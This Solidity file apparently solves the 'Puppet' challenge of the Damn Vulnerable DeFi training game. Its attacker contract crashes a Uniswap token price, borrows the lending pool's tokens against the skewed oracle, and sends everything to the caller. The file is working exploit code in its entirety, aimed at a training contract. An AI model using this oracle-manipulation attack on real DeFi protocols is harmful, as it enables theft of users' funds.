// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../src/puppet/PuppetPool.sol";
import "../../src/DamnValuableToken.sol";

contract Attacker {
    DamnValuableToken token;
    PuppetPool pool;

    receive() external payable{} // receive eth from uniswap

    constructor(uint8 v, bytes32 r, bytes32 s,
                uint256 playerAmount, uint256 poolAmount,
                address _pool, address _uniswapPair, address _token) payable{
        pool = PuppetPool(_pool);
        token = DamnValuableToken(_token);
        prepareAttack(v, r, s, playerAmount, _uniswapPair);
        // swap token for eth --> lower token price in uniswap
        _uniswapPair.call(abi.encodeWithSignature(
            "tokenToEthSwapInput(uint256,uint256,uint256)",
            playerAmount,
            1,
            type(uint256).max
        ));
        // borrow token from puppt pool
        uint256 ethValue = pool.calculateDepositRequired(poolAmount);
        pool.borrow{value: ethValue}(
            poolAmount, msg.sender
        );
        // repay tokens to uniswap --> recovery balance in uniswap
        _uniswapPair.call{value: 10 ether}(
            abi.encodeWithSignature(
                "ethToTokenSwapOutput(uint256,uint256)",
                playerAmount,
                type(uint256).max
            )
        );
        token.transfer(msg.sender, token.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    function prepareAttack(uint8 v, bytes32 r, bytes32 s, uint256 amount, address _uniswapPair) internal {
        // tranfser player token to attacker contract
        token.permit(msg.sender, address(this), type(uint256).max, type(uint256).max, v,r,s);
        token.transferFrom(msg.sender, address(this), amount);
        token.approve(_uniswapPair, amount);
    }
}